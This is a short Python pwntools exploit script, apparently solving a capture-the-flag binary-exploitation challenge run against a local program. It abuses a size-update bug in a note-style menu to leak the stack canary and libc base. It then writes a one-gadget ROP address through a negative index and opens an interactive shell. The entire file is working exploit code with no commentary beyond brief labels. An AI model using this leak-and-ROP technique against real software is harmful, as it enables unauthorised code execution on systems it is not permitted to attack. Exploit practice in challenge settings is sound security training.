# test in local

from pwn import *

#context.log_level = 'debug'

libc_path = '/usr/lib/libc.so.6'
libc = ELF(libc_path)
libc_rop = ROP(libc)


p = process('./deploy/prob', env={"LD_PRELOAD": libc_path})


###########################################
# 1: leak libc + canary

# create
for _ in range(10):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'size', b'40') #0x28
    p.sendafter(b'data', b'A'*0x28)

# update
p.sendlineafter(b'>', b'3')
p.sendlineafter(b'index', b'9')
p.sendlineafter(b'size', b'72')

# read
p.sendlineafter(b'>', b'2')
p.sendlineafter(b'index: ', b'9')
p.recv(48)
canary_leak = u64(p.recv(8))
p.recv(8)
libc_leak = u64(p.recv(8))

# leak!!
libc_leak_offset = libc.symbols['__libc_start_main'] - 0x2b
libc_base = libc_leak - libc_leak_offset
print(f"leaked canary: {canary_leak:#x}")
print(f"leaked libc_base: {libc_base:#x}")


###########################################
# 2: exploit ROP
rop_onegadget = libc_base + 0xe5ff0
rop_ret = libc_base + libc_rop.find_gadget(['ret'])[0]
payload = b'A'*16 + p64(rop_onegadget)

print('rop_ret: ' + hex(rop_ret))
print('rop_onegadget: ' + hex(rop_onegadget))

p.sendlineafter(b'>', b'3')
p.sendlineafter(b'index', b'-2')
p.sendlineafter(b'size', b'40')
pause()
p.sendafter(b'data: ', payload)

p.interactive()